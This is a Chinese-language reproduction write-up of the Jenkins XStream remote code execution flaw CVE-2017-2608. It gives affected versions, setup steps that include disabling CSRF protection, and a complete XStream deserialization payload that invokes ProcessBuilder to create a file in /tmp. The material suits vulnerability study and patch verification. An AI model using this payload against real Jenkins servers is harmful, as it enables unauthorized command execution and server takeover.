## jenkins xstream远程代码执行漏洞cve-2017-2608

#### 1.漏洞信息

| 项目     | 描述                                                         |
| -------- | ------------------------------------------------------------ |
| 漏洞名称 | jenkins xstream远程代码执行漏洞                              |
| CVE编号  | cve-2017-2608                                                |
| 漏洞描述 | 此漏洞存在于XStream API，（例如XStream/ createitem URL，或config.xml远程API），攻击者可以通过该漏洞成功发起远程代码执行攻击，严重情况下可以获取服务器权限。 |
| 影响范围 | 所有已发布的Jenkins版本，包括 2.43 所有已发布的Jenkins LTS版本，包括2.32.1 |

#### 2.漏洞复现

###### 2.1环境搭建

​	jenkins 1.637

###### 2.2复现漏洞

​	2.2.1 启动jenkins，并登录jenkins

​	2.2.2 访问your-ip:8080/configureSecurity关闭跨站请求的选项

​	2.2.3 发送xml

```
<set>
    <hudson.util.RunList>
        <base class="java.util.ServiceLoader">
            <providers/>
            <lookupIterator>
                <configs class="java.util.Collections$3">
                    <i class="java.util.AbstractList$Itr">
                        <cursor>0</cursor>
                        <lastRet>-1</lastRet>
                        <expectedModCount>0</expectedModCount>
                        <outer-class class="java.util.Arrays$ArrayList">
                            <a class="string-array">
                                <string>foo</string>
                            </a>
                        </outer-class>
                    </i>
                    <val_-c class="java.util.Arrays$ArrayList" reference="../i/outer-class"/>
                </configs>
                <pending class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.AbstractList$Itr">
                        <cursor>0</cursor>
                        <lastRet>-1</lastRet>
                        <expectedModCount>0</expectedModCount>
                        <outer-class class="java.util.Arrays$ArrayList">
                            <a>
                                <java.lang.ProcessBuilder>
                                    <command>
                                        <string>touch</string>
                                        <string>/tmp/bb</string>
                                    </command>
                                    <redirectErrorStream>false</redirectErrorStream>
                                </java.lang.ProcessBuilder>
                            </a>
                        </outer-class>
                    </iter>
                    <filter class="javax.imageio.ImageIO$ContainsFilter">
                        <method>
                            <class>java.lang.ProcessBuilder</class>
                            <name>start</name>
                            <parameter-types/>
                        </method>
                        <name>foo</name>
                    </filter>
                    <next class="java.util.HashMap$Node">
                        <hash>101575</hash>
                        <key class="string">foo</key>
                        <value class="string">foo</value>
                    </next>
                </pending>
                <outer-class reference="../.."/>
            </lookupIterator>
        </base>
    </hudson.util.RunList>
</set>
```

![](1.png)

###### 2.3问题现象

![](2.png)